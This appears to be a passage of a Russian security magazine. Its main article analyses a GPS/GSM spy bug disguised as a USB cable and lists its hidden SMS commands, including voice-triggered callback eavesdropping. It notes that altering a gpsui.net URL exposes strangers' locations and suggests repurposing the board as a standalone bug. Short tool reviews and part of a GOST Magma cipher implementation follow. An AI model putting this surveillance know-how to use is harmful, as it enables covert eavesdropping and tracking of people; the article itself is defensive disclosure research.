Found GigaDevice flash chip "GD25LQ32" (4096 kB, SPI) on fernva
le_spi.
No operations were specified.



АНАЛИЗ

В основном ради само обра зования я решил про анализировать дамп фир‐
мвари.


Сниффинг SIM (через SIMtrace)





Первым делом я поснифал действия с SIM‐картой. Интерес но, что устройство
получает доступ ко всем записям телефонной книги и SMS. Если точнее, то
оно читает следующие файлы (чего совершенно не нужно для его функци они‐
рования):


ADF
 • EF(ECC)
 • EF(EXT2)
 • EF(SMS)


DF(TELECOM) → DF(PHONEBOOK)
 • EF(ADN)
 • EF(ANRA1)
 • EF(SMS)

Другие операции с SIM‐картой вопросов не вызвали.
   Вряд ли это какая‐то мощная схема по сбору телефонных номеров и их
отправке в Китай, скорее какой‐то стандартный код для работы с SIM,
который не сократили с учетом функций устрой ства. Тем не менее я нахожу
небезынтересным то, что устройство дотягивается вообще до все го, что есть
на SIM‐карте.



ПОПЫТКА ПОСНИФАТЬ GPRS (ЧЕРЕЗ OPENBTS)





Следующее, что я поп робовал сделать, — это пос нифать сетевой трафик,
чтобы понять, что передается по мобильной свя зи. Для этого я использовал
Ettus B100 с OpenBTS.
   К сожалению, S8 data  line locator не подклю чается к GPRS. Когда я
попытался отправить команду dw, чтобы зап росить координаты, в ответ приш‐
ло вот что:


Loc:Please link:http://gpsui.net/smap.php?lac=1000&cellid=10&c=901&n=
70&v=7100 Battery:67%


Со держимое flash
Все самое интересное нашлось в дампе флеша.


ОС
Судя по строкам во flash.dat, устройство работает на Nucleus RTOS.


$ strings ‐a flash.dat
Copyright (c) 1993‐2000 ATI ‐ Nucleus PLUS ‐ Version ARM 7/9  1.11.19

Вот другие строки, которые помогают идентифицировать ОС.


$ strings ‐a flash.dat | grep "\.c"
psss\components\src\bl_Secure_v5.c
psss\components\src\SSS_secure_shared_v5.c
hal\system\bootloader\src\bl_Main.c
hal\system\bootloader\src\bl_Main.c
hal\system\bootloader\src\bl_FTL.c
hal\system\bootloader\src\bl_FTL.c
hal\system\bootloader\src\bl_FTL.c
hal\storage\flash\mtd\src\flash_disk.c
hal\system\bootloader\src\bl_Main.c
hal\peripheral\src\dcl_pmu6261.c
hal\system\cache\src\cache.c
hal\peripheral\src\dcl_rtc.c
hal\peripheral\src\dcl_pmu6261.c
hal\system\bootloader\src\bl_FTL.c
hal\system\bootloader\src\bl_FTL.c
hal\peripheral\src\rtc.c
hal\peripheral\src\rtc.c
hal\peripheral\src\rtc.c
hal\peripheral\src\rtc.c
hal\peripheral\src\rtc.c
hal\peripheral\src\rtc.c
hal\storage\flash\mtd\src\flash_mtd_sf_dal.c
hal\peripheral\src\dcl_pmu_common.c
hal\peripheral\src\dcl_f32k_clk.c
hal\peripheral\src\dcl_f32k_clk.c
hal\peripheral\src\dcl_gpio.c
hal\peripheral\src\dcl_pmu_common.c
hal\system\cache\src\cache.c
hal\peripheral\src\dcl_f32k_clk.c
hal\peripheral\src\dcl_gpio.c
hal\peripheral\src\gpio.c
hal\system\bootloader\src\bl_FTL.c
hal\peripheral\src\rtc.c
hal\peripheral\src\bmt_hw.c
hal\peripheral\src\dcl_pmu6261.c
hal\storage\flash\mtd\src\flash_mtd.c
hal\peripheral\src\gpio.c
custom\common\hal\combo_flash_nor.c
hal\peripheral\src\dcl_rtc.c
hal\peripheral\src\dcl_rtc.c
hal\storage\flash\mtd\src\flash_disk.c
custom\common\hal\combo_flash_nor.c
hal\storage\flash\mtd\src\flash_mtd_sf_dal.c
hal\system\emi\src\emi.c
sss\components\src\SSS_secure_shared_common.c
alice.c
ddload.c
plutommi\Framework\GDI\gdisrc\gdi.c
C.cKi
hal\audio\src\v1\audio_service.c
ddload.c
ddload.c
plutommi\Framework\GDI\gdisrc\gdi_image_hwjpg_v2.c
plutommi\Framework\GDI\gdisrc\gdi_image_hwjpg_v2.c
plutommi\Framework\GDI\gdisrc\gdi_util.c
plutommi\Framework\GDI\gdisrc\gdi_util.c
hal\audio\src\v1\audio_service.c
ddload.c


Файловые системы FAT12
Апдейт:  когда  я  писал  этот  текст,  я  пропус тил  слой  трансля ции
флеш‐памяти, поэтому файловая система FAT12 ока залась битой. Спасибо
@viperbjk за то, что указал на это. Я попытаюсь все же вос становить флеш
и допол нить текст, когда получится. А пока что вот отчет о моей первоначаль‐
ной попытке выцепить файловую систему.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
         ВСКРЫВАЕМ
 ХАРДВЕРНЫЙ ИМПЛАНТ
                  КАК УСТРОЕН ДЕВАЙС ДЛЯ СЛЕЖКИ,
             ЗАМАСКИРОВАННЫЙ ПОД КАБЕЛЬ USB




Два раздела не похожи на валидные системы FAT12.


$ fls ‐o 5646 flash.dat ‐f fat12
Invalid magic value (Not a FATFS file system (magic))
$ fls ‐o 5826 flash.dat ‐f fat12
v/v 6531:   $MBR
v/v 6532:   $FAT1
v/v 6533:   $FAT2
d/d 6534:   $OrphanFiles
$ fls ‐o 5853 flash.dat ‐f fat12
Invalid magic value (Not a FATFS file system (magic))

В середине блок FAT12 тоже, кажет ся, поврежден, сплошные файлы‐сироты.


$ fls ‐o 5826 flash.dat ‐rp ‐f fat12
v/v 6531:   $MBR
v/v 6532:   $FAT1
v/v 6533:   $FAT2
d/d 6534:   $OrphanFiles
‐/r * 469:  $OrphanFiles/MP0B_001
‐/r * 470:  $OrphanFiles/ST33A004
‐/r * 471:  $OrphanFiles/ST33B004
[...]

Я попробовал извлечь файлы:


fls ‐o 5826 flash.dat ‐Frp ‐f fat12 | while read line; do
    path=$(echo "$line" | awk ‐F':' '{print $2}')
    mkdir ‐p $(dirname $path);
    icat ‐o 5826 flash.dat $(echo "$line" | grep ‐oE "[0‐9]+" | head
‐n1) > $path
done

Но большинство оказались пустыми. Причем результаты очень неконсистен‐
тные: если сменить SIM‐карту, то в файлах, которые показывает The Sleuthkit,
находится масса различий. Получается, что это либо не FAT12, либо какой‐то
его сильно модифицированный вариант.
  Замечу еще раз, что я пропустил слой трансля ции флеш‐памяти (FTL).
Существуют проприетарные утилиты, которые могут с ним справиться.
  Я же хочу придерживать ся только опенсорсных утилит, поэтому даль‐
нейшее иссле дование было сделано при помощи hexdump.


Дан ные кон фигурации
На флеше, помимо прочего, обна ружились нас тройки. Это в первую очередь
IMSI находящейся внутри симки и номер, который использовался для удален‐
ного управления.





В сегменте выше ты можешь видеть ссылки на gpsui.net. Предположительно
это удаленный сервер, который использует ся, чтобы превращать коды MCC,
MNC, LAI и CID в названия улицы, города и страны, а также для получения
ссылки на gpsui.net, которая перенаправляет на Google Maps. Но поскольку
записать флеш у меня не вышло, эта гипотеза так и осталась непроверенной.


Скры тые коман ды
В какой‐то момент мне все же удалось най ти кое‐что, что оправдало пот‐
раченные усилия. Поискав в файле ﬂash.dat стро ки dw, 1111 и 0000, я обна‐
ружил скрытые команды.





Однако большинство этих команд не работа ют как положено. Видимо, эта
прошивка используется в нес кольких похожих устрой ствах, на это указывают
команды, связанные со светодиода ми и карточкой TF, — ни того, ни другого
у девайса нет. Но у других устройств, про дающихся в интернете, — есть.
   Вот неполный список найденных мной команд и их ответов.
 • help: отве чает следующим списком команд:

    • dw: Локатор
    • qqq: Привязка устройства
    • 1111: Включить звук сигнализации
    • 0000: Выключить звук сигнализации
    • ddd: Сбросить все треки
    • aqb: Получить имя поль зователя и пароль
    • eee: Запись сох ранена
    • dde: Очистить карту TF
    • hhh: Статус устройства

 • loc: то же, что и dw
 • imsi: Запрос IMEI и IMSI
 • faa: «DTMG: успешно включено отслежива ние голоса, ответ по SMS и чувс‐
   твительность:40», «DMTG: детектирован необычный звук»
 •  ﬀf: «DT: успешно включено реагирова ние на голос и обратный звонок,
   чувствительность:40»
 • 1111: «DT: Успешно включено реагирова ние на голос и обратный звонок,
   чувствительность:400»
 • 0000: «DT: Отслежива ние голоса успешно отменено»
 • gbrpt: «Report:Location the continuous escalation has been closed» (веро‐
   ятно, «продолжительное отслеживание локации остановлено» на китай‐
   ском английском. — Прим. пер.)
 • track: «Track: Режим ответа на звонки переведен на сообщение локации»
 • hbton: «Hbt: Устрой ство переведено на постоянное подключение»
 • hbtoﬀ: «Hbt: Постоянное подключение устрой ства закрыто»
 • esionow: “…” ?
 • esioaddr: «Ошибка сохранения адреса esio и порта!»
 • esiolocatetype: «Esio:Тип отчета о локации обновлен и выставлен в 0»
 • server: «Ошибка настройки адреса сервера и порта!»
 • reg: “…” ?
 • monitor: «Monitor: Режим ответа на звонки настроен на автоматический
   ответ»
 • eee: «Ошибка при проверке карты TF, либо недостаточно свободного мес‐
   та!»
 • sndstop: «Cam:Нет запущенных задач, ошиб ка отмены!»
 • e81: “…” ?
 • e80: “…” ?
 • soson, sosoﬀ, sos, qcsos: ?
 • ledon, ledoﬀ: ?
 • ﬂighton, ﬂightoﬀ: ?
 • aqe: «Ошибка сох ранения apn!»
 • imeiset: “…” кажется, не уста навлива ет IMEI
 • restore: «Восстановление прошло успешно!»
 • formattf: ?
 • time: “…” ?
 • timezone: «Успешно изменена временная зона. Текущая зона 0»
 • age: “…” ?
 • 3646655: запрашивает информацию о версии
 • reboot: перезагружает устрой ство

Интересно, что ответных строк нет во флеше в плейнтексте. Это значит, что
данные сжаты.
   Дальше привожу свой лог, где я пробую най денные скрытые команды,
которые я привел в списке выше в том же порядке.





Похоже, с помощью esioaddr мы можем менять адрес, используемый
при запросе дополнительной информации о геолокации. Однако когда я поп‐
робовал задать это значение, никакого соединения с указанным IP не пос‐
ледовало. Девайс прос то ответит the addr invalid в отчете о местополо‐
жении.
  Команда server назнача ет другой сервер. Его смена не приводит к отве ту
the addr invalid, как видно из моего лога.





Опе раторские логи звон ков и детализация по сче ту
Поскольку затея со сниффингом GPRS про валилась, мне осталось только
изучать детализацию, которую предос тавляет мой оператор, чтобы получше
понять привычки S8 data line locator.
  Очевидно, что за ответы по SMS снимаются деньги. Но гораздо интерес‐
нее паттерны доступа к интернету.


Ко ман ды dw и loc, а так же доступ при простое
Во время запросов, свя занных с мес тоположением, устройство использует
сервис «MMS/интернет». На скриншоте ниже приведен сегмент, в котором
сначала несколько раз делаются запросы, а затем устройство остается в сос‐
тоянии покоя.
  Но даже во время прос тоя девайс иногда использует сервис «MMS/
интернет».
  Даже несмотря на то, что я отклю чил все функции тре кинга, которые я мог
случайно активировать во время тестирова ния, я не могу на 100% поручить‐
ся, что это не что‐то активированное мной, быть может, при изучении сайта
gpsui.net. Тем не менее независимо от того, я акти вировал эту «фичу» или нет,
хотелось бы знать, что за данные передаются и как это пре сечь.


gpsui.net
Если покопаться на  gpsui.net поглубже, то можно, наверное, написать
еще одну статью. Это огромный наблюдательный центр: просто поменяй xxxx
в адресе http://gpsui.net/u/xxxx на какие‐нибудь буквы и цифры, и уви‐
дишь местоположение случайных людей.
   Также на сайте встречается упомина ние ZhiPu. Похоже, это компания,
которая делает эти трекеры.





Получить данные учетной записи мож но, отправив текстовое сообщение aqb
на S8 data line monitor. Имя пользователя и пароль — это шес тизначные циф‐
ры. Они, кстати, помещаются во флеш‐память прямо перед IMSI.
   Веб‐интерфейс позволя ет получить дос туп к нес кольким фичам. Я не могу
гарантировать, что они будут работать, — мне они неинтересны, и я их не тес‐
тировал.


Интерфейс
Вот как выглядит чистый интерфейс сра зу пос ле логина.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
         ВСКРЫВАЕМ
 ХАРДВЕРНЫЙ ИМПЛАНТ
                  КАК УСТРОЕН ДЕВАЙС ДЛЯ СЛЕЖКИ,
              ЗАМАСКИРОВАННЫЙ ПОД КАБЕЛЬ USB




Я лишь передвинул карту на океан, чтобы скрыть свое местоположение. Оно
отмечается на карте небольшим изоб ражением машины и поп‐апом с коор‐
динатами GPS и датой пос леднего апдейта.


Настройки
Можно менять некото рые настройки.





Опо вещения
Можно настроить оповещения.





Риалтаймовое отсле живание местополо жения
Можно вклю чить непрерывный трекинг.





История
Интересно, что веб‐интерфейс поз воляет проиграть все запросы местополо‐
жения.





Я нахожу это в особен ности неприятным, потому что в руководс тве к S8 data
line locator не упомянуто ни создание учетной записи, ни способ заполучить
ее. И конечно, я не ожидал, что история запросов будет где‐то храниться.


Фен синг
Можно назначить геофенсинг — оповещение о пересечении определенных
координат.





Пуш‑коман ды
Сервис позволяет отправлять команды устрой ству.





Это означает, что любой, кто имеет дос туп к учет ной записи на gpsui.net,
может управлять твоим устройством. Ни упаковка, ни руководс тво которого
вообще не сообщали о существовании этого сай та.


Управле ние устройствами
Ты можешь собрать парк своих устройств в один аккаунт для более удоб ного
управления.





Уяз вимости
После публикации этой статьи @evstykas нашел несколько уязвимостей типа
«небезопасные прямые ссылки на объекты с бай пасом авторизации» (Inse‐
cure  Direct  Object  References  with  Authorization  bypass), которые  ведут
к горизонталь ной эскалации привилегий: пользователь может просматривать
и менять информацию всех 615 817 других пользователей gpsui.net.
   Так что мои изначальные подоз рения насчет gpsui.net оказались верными:
отправлять сюда свои данные — плохая идея.
   Затем мы изучили несколько других веб‐сервисов для отслеживания
геолокации. То, что нам удалось найти, вызывает некоторые опасения,
об этом ты можешь прочитать здесь: 0x0.li/trackmageddon/.
  Я же хочу подчеркнуть, что обычный пользователь (насколько мне извес‐
тно) никак не информируется о создании учетной записи на сайте.
   Точно так же его не информируют и о том, что его запросы логиру ются
и хранятся. Или о том, что его устройством можно управлять с этого сайта.


Как искать жуч ки
Во время передачи данных S8 data line locator можно опре делить при помощи
недорогого китайского радиолокатора CC308+.





Девайс, похоже, пло хо экра нирован, и запрос локации командой dw вызовет
заметный электромагнитный шум. Да и в целом устройство генерирует много
радиопомех.



ПРЕДСТОЯЩАЯ РАБОТА

Несмотря на то что мне (пока что) не удалось дос тигнуть своей основной
цели — отключить функцию «отсту ка» на базу, это был занятный опыт. Я наде‐
юсь, ты найдешь его полез ным или как минимум поучительным.


Проб лемы
Мне пока что не уда лось создать собственную прошивку при помощи
ﬂashrom, поскольку я (пока что) не могу снять защиту от записи. Возможно,
другим подходом к прошиванию может стать утилита SPFlash и/или Flash.
Хоть это и не опенсорсные решения. Если тебе удалось про шить S8
data line locator, обязательно напиши мне об этом со все ми под-
робностями!
   Далее я попытался выловить данные, передаваемые по GPRS, но мне
это не удалось. Устрой ство прос то не использовало GPRS, когда я под ключил
его к своей сети. Я не знаю, как сконфигурирован APN. Отслеживание
сим‐карты не дает информа ции о дос тупе к EF(ACL). Тем не менее кон‐
фигурацию APN удалось найти во флеш‐памяти устройства — это говорит
о том, что оно получило ее из сервисной SMS, прис ланной оператором.


Идеи
Плату можно обточить, так как коннектор USB тебе не пригодится. S8 data line
locator превратится в «модульного» жучка, который можно установить куда
угодно, где есть источник тока с характеристиками 5 В и 1 А.



ПРИЛОЖЕНИЕ: ФАКАП

Куда же без описания факапа! Во время исполь зования S8 data line locator
совместно с OpenBTS я навводил воображаемых номеров. Пос ле смены
сим‐карты я забыл вык лючить обратный вызов, акти вируемый голосом.
  В общем, какой‐то чувак с номером 3333333 слушал меня две минуты.




Оказалось, что это какой‐то «сервисный» номер, так что звонок вышел
недешевым. Но важнее то, что я ничего не заметил, пока не посмотрел логи.
   Так  что мое  заключение о шпионских  хардверных имплантах: они
незаметны и до фига опасны!


        WWW

                    •Видео, иллюстрирующее эту статью
                         •@dmxinajeansuit тоже работает над подобным
                        проектом
ТРЮКИ





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



       ASCIICASTS — УТИЛИТА ДЛЯ ЗАПИСИ КОНСОЛЬНЫХ
      СКРИНКАСТОВ И АНИМАЦИОННОГО ASCII-АРТА
       Ты наверняка видел не один скрин каст, где автор что‐то долго1        и печально набирает в терминале. Не исключено, что тебе при этом
        отдельно досаж дало низкое качество видео — буквы иногда еле
        разберешь. Но что, если в таких случаях записы вать не видео,
        а непосредственно ввод‐вывод терминала? И занимать будет мень‐
        ше, и выглядеть лучше!





       Именно это и делает утилита asciicasts, которая работает в Linux
        и Unix семейства BSD, в том числе macOS. Для ее установки
       можешь выбрать удоб ный тебе репозиторий, скачать контейнер
        Docker или соб рать из исходных кодов (все соответс твующие
        команды ты найдешь по ссылке). Я поставил через маковский
       менеджер пакетов brew.
        Обращаться с утилитой предельно прос то: пишешь asciinema
        rec, и она начина ет записы вать все, что происходит в консоли.
       Для остановки записи достаточно нажать Ctrl‐d. Программа спро‐
          сит, сохранить файл локально или загрузить на asciinema.org. Вос‐
        произвести запись можно командой asciinema  play. Указывать
       можно как локальный файл, так и ссылку на сайт.





       На asciinema.org в раз деле Explore уже полно скринкастов со всяким
        баловством: демки, кон сольные игры типа NetHack и прочее. Но не
        исключено, что у «аскикас тов» есть и более серьезные применения:
        например, если по какой‐то при чине понадобится запус тить у себя
        в терминале аутентично выглядящую имитацию бурной деятельнос‐
          ти.


      LOBE — СЕРВИС, КОТОРЫЙ ОБЕЩАЕТ СДЕЛАТЬ
     МАШИННОЕ ОБУЧЕНИЕ ДОСТУПНЫМ КАЖДОМУ
        Как известно, работа с моделями нейросетей для глубокого машин‐2        ного обучения в чем‐то сродни шаманству. Но  чтобы начать
        шаманить, нужно сна чала раз вернуть у себя окружение из многих
        частей — под час непростых в нас трой ке. Возможно, уже скоро
        при решении многих типовых задач всего этого можно будет избе‐
         жать.
       Мы не часто пишем о сервисах, которые нельзя сразу же взять
        и попробовать, но Lobe — это случай, достойный того, чтобы сде‐
         лать исклю чение. Доступ к нему пока что есть только у избранных,
        в число которых можно попытаться попасть, оставив свой email
        на сайте.
         Почему стоит это сделать? В обзорном видео разработчики
        показывают нес коль ко примеров того, на что способен Lobe.





       Простым перетас киванием блоков и выбором нас троек они соз дают
        нейросети, способ ные,  к примеру, распознавать  угол, который
        человек рукой показывает на фото (или на видео, поступающем
        с камеры), или уга дывать инс трумент по зву ковому файлу, или даже
        опре делять архитектурный стиль здания по фотографии.





         Знаменитый детектор хотдогов из сери ала «Кремниевая
          долина» делается за пять минут

       Предполагается, что открытые API поз волят задействовать Lobe
        в собственных сервисах. Глубокое машин ное обучение может быть
        полезно не только в ситуациях, требующих распознавать объ екты
        или синтезировать изображения, но и в гораздо менее зрелищных
         случаях: например, когда нужно предсказать изменение каких‐то
        данных.
          Разработчики Lobe нацелены как на новичков в деле машинного
        обучения, желающих быстро состря пать что‐нибудь работающее,
         так и на профес сиона лов, которым удобство работы и наглядная
         визуализация тоже дол жны замет но облегчить жизнь. Модели, соз‐
        данные и натрениро ванные в Lobe, можно затем экспортировать
        в форматах TensorFlow или CoreML.


      CARBON — СЕРВИС ДЛЯ СОЗДАНИЯ ИДЕАЛЬНЫХ
      СКРИНШОТОВ КОДА
      В теории сделать скриншот кода, чтобы кому‐то показать, — задача3        несложная. В реальнос ти раз говор после этого нередко сворачи‐
        вает на то, как у тебя нас троен редактор и какой шрифт лучше
        для программирова ния. Поэто му вовсе не помешает способ делать
        идеально ровные картинки, которые не будут выдавать о тебе
        ничего лишнего.
         Простенький сервис под наз ванием Carbon делает именно это:
        дает тебе окошко, куда можно вста вить код, выбрать вид подсветки
        и сохранить картинку себе на диск (или сразу отправить в Twitter).
       Заодно настраивается множество дру гих вещей: шрифт, любые
        параметры окна и так далее.





      В будущем авторы про екта планируют увеличить число поддержи‐
        ваемых языков, сделать версию для мобильных устройств и реали‐
        зовать еще большее количество нас троек. Ис ходные коды Carbon
        доступны на GitHub, так что при желании ты можешь даже поп‐
        робовать встроить его в свой сайт.
КОДИНГ
РУССКАЯ
«МАГМА»





                                        Евгений Дроботун
                                         Постоянный автор рубрики
                                                   Malware


            КАК РАБОТАЕТ
      ОТЕЧЕСТВЕННЫЙ АЛГОРИТМ
      БЛОЧНОГО ШИФРОВАНИЯ





В прошлой части наших «извра щений с импортозамещени‐
ем» (давно это было, Евгений работает над докторской дис‐
сертацией, и мы все ждем, когда будет можно подписывать
его статьи «профессором». ;) — Прим. ред.) мы подробно
познакомились  с  алгоритмом шифрования  «Кузнечик»,
который определен в ГОСТ 34.12—2015. Помимо этого
алгоритма, в ГОСТе описан еще один, с дли ной шифруемого
блока в 64 бита, который носит название «Магма».


             INFO

                     Предыдущие статьи цик ла: про «Кузнечик», про
                       «Стрибог».


Этот алгоритм представляет собой точную копию алгоритма блочного шиф‐
рования из старого ГОСТ 28147—89, за одним исключением. В новом
ГОСТ 34.12—2015 определена и задана таб лица перестановок для нелиней‐
ного  биективного  преобразования,  которая  в  старом ГОСТ 28147—
89 отсутствовала, и задание ее элементов полностью отдавалось в руки
людей, реализующих данный алгоритм. Теоретичес ки, если определить эле‐
менты таблицы перестановок самос тоятельно и сохранить таб лицу в тайне,
это позволит повысить стойкость алго ритма шифрования (за счет этого фак‐
тически увеличивается длина ключа), однако,  как видим, разработчики
ГОСТ 34.12—2015 решили лишить самостоятель нос ти пользователей стан‐
дарта.
   Как уже было сказано, длина шифруемого блока в алгоритме «Магма» —
64 бита. Длина ключа шифрования — 256 бит.


           WARNING

                    При чтении ГОСТа учти, что во всех 8‐байтовых
                     массивах тестовых последовательностей нулевой
                       байт находится в конце массива, а седьмой,
                        соответственно, в начале (если ты внимательно
                        читал статьи про «Стрибог» и «Кузнечик», то эта
                      особенность наших крип тостандартов тебе дол‐
                     жна быть знакома).



НЕМНОГО ТЕОРИИ
В описываемом алго ритме блок, подлежащий зашифровыванию (напомню,
его длина 64 бита), разделяется на две равные по длине (32 бита) части —
правую и левую. Далее выполняется тридцать две итерации с использовани‐
ем итерационных ключей, получа емых из исходного 256‐битного ключа шиф‐
рования.





            Схема работы алгоритма при зашифровывании

Во время каждой итерации (за исключением тридцать второй) с правой
и левой половиной зашифровываемо го блока производится одно преобра‐
зование, основанное на сети Фейстеля. Сначала пра вая часть складывается
по модулю 32 с текущим итерационным ключом, затем полученное 32‐битное
число делится на восемь 4‐битных и каж дое из них с использованием таб‐
лицы перестановки преобразуется в другое 4‐битное число (если помнишь,
то в предыдущих двух статьях это называлось нелинейным биективным пре‐
образованием). После это го преобра зования полученное чис ло циклически
сдвигается влево на одиннадцать раз рядов. Далее результат ксорится
с левой половиной блока. Получившееся 32‐битное чис ло записы вается
в правую половину блока, а ста рое содержимое пра вой половины переносит‐
ся в левую половину блока.





                      Схема одной итерации

В ходе последней (тридцать вто рой) итерации так же, как описано выше, пре‐
образуется правая половина, после чего полученный результат пишется
в левую часть исходного бло ка, а пра вая половина сохраняет свое значение.
   Итерационные ключи  получа ются  из  исходного  256‐битного ключа.
Исходный ключ делится на восемь 32‐битных подклю чей, и далее они исполь‐
зуются в следующем порядке: три раза с первого по восьмой и один раз
с восьмого по первый.





               Схема получения итерационных ключей

Для расшифровывания используется такая же последовательность итераций,
как и при зашифровыва нии, но порядок следования ключей изменяется
на обратный.





            Схема работы алгоритма при расшифровывании

Итак, после краткого и небольшого погружения в теорию начинаем кодить...


БАЗОВЫЕ ФУНКЦИИ СТАНДАРТА
Поскольку в алгоритме используются 32‐битные блоки (в виде так называ‐
емых двоичных векторов), для начала определим этот самый блок:


// Размер блока 4 байта (или 32 бита)
#define BLOCK_SIZE 4
...
// Определяем тип vect как 4‐байтовый массив
typedef uint8_t vect[BLOCK_SIZE];


Сло жение двух дво ичных век торов по модулю 2
Каждый байт первого вектора ксорится с соот ветс твующим байтом второго
вектора, и результат пишется в третий (выходной) вектор:


static void GOST_Magma_Add(const uint8_t *a, const uint8_t *b,
uint8_t *c)
{
  int i;
  for (i = 0; i < BLOCK_SIZE; i++)
    c[i] = a[i]^b[i];
}


Сло жение двух дво ичных век торов по модулю 32
Данная функция аналогична функции под наз ванием «сложение в кольце
вычетов по модулю 2 в степени n» из алгоритма «Стри бог», за исключением
того, что n в нашем случае будет равно 32, а не 512, как в стандарте «Стри‐
бог». Два исходных 4‐байтовых вектора представляются как два 32‐битных
числа, далее они складываются, переполнение, если оно появляется, отбра‐
сывается:


static void GOST_Magma_Add_32(const uint8_t *a, const uint8_t *b,
uint8_t *c)
{
  int i;
  unsigned int internal = 0;
  for (i = 3; i >= 0; i‐‐)
  {
    internal = a[i] + b[i] + (internal >> 8);
    c[i] = internal & 0xff;
  }
}


Не линейное биек тивное пре образование (пре образование T)
В отличие от алгоритмов «Стрибог» и «Кузнечик» (кстати, там это пре обра‐
зование  называется  S‐преобра зованием)  таблица  перестановок  здесь
используется другая:


static unsigned char Pi[8][16]=
{
  {1,7,14,13,0,5,8,3,4,15,10,6,9,12,11,2},
  {8,14,2,5,6,9,1,12,15,4,11,0,13,10,3,7},
  {5,13,15,6,9,2,12,10,11,7,8,1,4,3,14,0},
  {7,15,5,10,8,1,6,13,0,9,3,14,11,4,2,12},
  {12,8,2,1,13,4,15,6,7,0,10,5,3,14,9,11},
  {11,3,5,8,2,15,10,13,14,1,7,4,12,9,6,0},
  {6,8,2,3,9,10,5,12,1,14,4,7,11,13,0,15},
  {12,4,6,2,10,5,11,9,14,8,13,7,0,3,15,1}
};

Поскольку в тексте стандарта (по неведо мой традиции) нулевой байт пишется
в конце, а последний в начале, то для корректной работы программы строки
таблицы необходимо записывать в обратном порядке, а не так, как изложено
в стандарте.
  Код самой функции преобра зова ния T получа ется такой:


static void GOST_Magma_T(const uint8_t *in_data, uint8_t *out_data)
{
  uint8_t first_part_byte, sec_part_byte;
  int i;
  for (i = 0; i < 4; i++)
  {
    // Извлекаем первую 4‐битную часть байта
    first_part_byte = (in_data[i] & 0xf0) >> 4;
    // Извлекаем вторую 4‐битную часть байта
    sec_part_byte = (in_data[i] & 0x0f);
    // Выполняем замену в соответствии с таблицей подстановок
    first_part_byte = Pi[i * 2][first_part_byte];
    sec_part_byte = Pi[i * 2 + 1][sec_part_byte];
    // «Склеиваем» обе 4‐битные части обратно в байт
    out_data[i] = (first_part_byte << 4) | sec_part_byte;
  }
}


РАЗВЕРТЫВАНИЕ КЛЮЧЕЙ
В начале мы уже говорили, что для зашифровывания и расшифровывания нам
нужно тридцать два итерационных 32‐битных клю ча, которые получаются
из исходного 256‐битного.
  Для начала определим место, где будут хра нить ся полученные значения
клю чей:


vect iter_key[32]; // Итерационные ключи шифрования

После чего можно заняться непос редственным раз вертыванием ключей:


void GOST_Magma_Expand_Key(const uint8_t *key)
{
  // Формируем восемь 32‐битных подключей в порядке следования с
первого по восьмой
  memcpy(iter_key[0], key, 4);
  memcpy(iter_key[1], key + 4, 4);
  memcpy(iter_key[2], key + 8, 4);
  memcpy(iter_key[3], key + 12, 4);
  memcpy(iter_key[4], key + 16, 4);
  memcpy(iter_key[5], key + 20, 4);
  memcpy(iter_key[6], key + 24, 4);
  memcpy(iter_key[7], key + 28, 4);
  ...
  // Повторяем предыдущий кусочек кода еще два раза
  ...
  // Формируем восемь 32‐битных подключей в порядке следования с
восьмого по первый
  memcpy(iter_key[24], key + 28, 4);
  memcpy(iter_key[25], key + 24, 4);
  memcpy(iter_key[26], key + 20, 4);
  memcpy(iter_key[27], key + 16, 4);
  memcpy(iter_key[28], key + 12, 4);
  memcpy(iter_key[29], key + 8, 4);
  memcpy(iter_key[30], key + 4, 4);
  memcpy(iter_key[31], key, 4);
}





  Результат работы GOST_Magma_Expand_Key с клю чом из примера, при‐
  веденного в стандарте

Все это, конечно, можно написать с использованием циклов, но в данном
случае эта функция реализована, так сказать, «в лоб» для нагляднос ти, да и
работать она в таком виде теоретически должна быс трее.


Пре образование g
Это преобразование вклю чает в себя сложение правой части блока с ите‐
рационным клю чом по модулю 32, нелинейное биективное преобразование
и сдвиг влево на один надцать разрядов:


static void GOST_Magma_g(const uint8_t *k, const uint8_t *a, uint8_t
*out_data)
{
  uint8_t internal[4];
  uint32_t out_data_32;
  // Складываем по модулю 32 правую половину блока с итерационным
ключом
  GOST_Magma_Add_32(a, k, internal);
  // Производим нелинейное биективное преобразование результата
  GOST_Magma_T(internal, internal);
  // Преобразовываем четырехбайтный вектор в одно 32‐битное число
  out_data_32 = internal[0];
  out_data_32 = (out_data_32 << 8) + internal[1];
  out_data_32 = (out_data_32 << 8) + internal[2];
  out_data_32 = (out_data_32 << 8) + internal[3];
  // Циклически сдвигаем все влево на 11 разрядов
  out_data_32 = (out_data_32 << 11)|(out_data_32 >> 21);
  // Преобразовываем 32‐битный результат сдвига обратно в 4‐байтовый
вектор
  out_data[3] = out_data_32;
  out_data[2] = out_data_32 >> 8;
  out_data[1] = out_data_32 >> 16;
  out_data[0] = out_data_32 >> 24;
}


Пре образование G
Это преобразование представляет собой одну итерацию цикла зашиф‐
ровывания или расшифровывания (с первой по тридцать первую). Включает
в себя преобразование g, сло жение по модулю 2 результата преобразования
g с правой половиной блока и обмен содержимым между правой и левой
частью блока:


static void GOST_Magma_G(const uint8_t *k, const uint8_t *a, uint8_t
*out_data)
{
  uint8_t a_0[4]; // Правая половина блока
  uint8_t a_1[4]; // Левая половина блока
  uint8_t G[4];
  int i;
  // Делим 64‐битный исходный блок на две части
  for(i = 0; i < 4; i++)
  {
    a_0[i] = a[4 + i];
    a_1[i] = a[i];
  }
  // Производим преобразование g
  GOST_Magma_g(k, a_0, G);
  // Ксорим результат преобразования g с левой половиной блока
  GOST_Magma_Add(a_1, G, G);
  for(i = 0; i < 4; i++)
  {
    // Пишем в левую половину значение из правой
    a_1[i] = a_0[i];
    // Пишем результат GOST_Magma_Add в правую половину блока
    a_0[i] = G[i];
  }
  // Сводим правую и левую части блока в одно целое
  for(i = 0; i < 4; i++)
  {
    out_data[i] = a_1[i];
    out_data[4 + i] = a_0[i];
  }
}


Финальное пре образование G
Это последняя (тридцать вторая) итерация цикла зашифровывания или рас‐
шифровывания. От простого преобразования G отличается отсутствием
обмена значениями между пра вой и левой частью исходного блока:


static void GOST_Magma_G_Fin(const uint8_t *k, const uint8_t *a,
uint8_t *out_data)
{
  uint8_t a_0[4]; // Правая половина блока
  uint8_t a_1[4]; // Левая половина блока
  uint8_t G[4];
  int i;
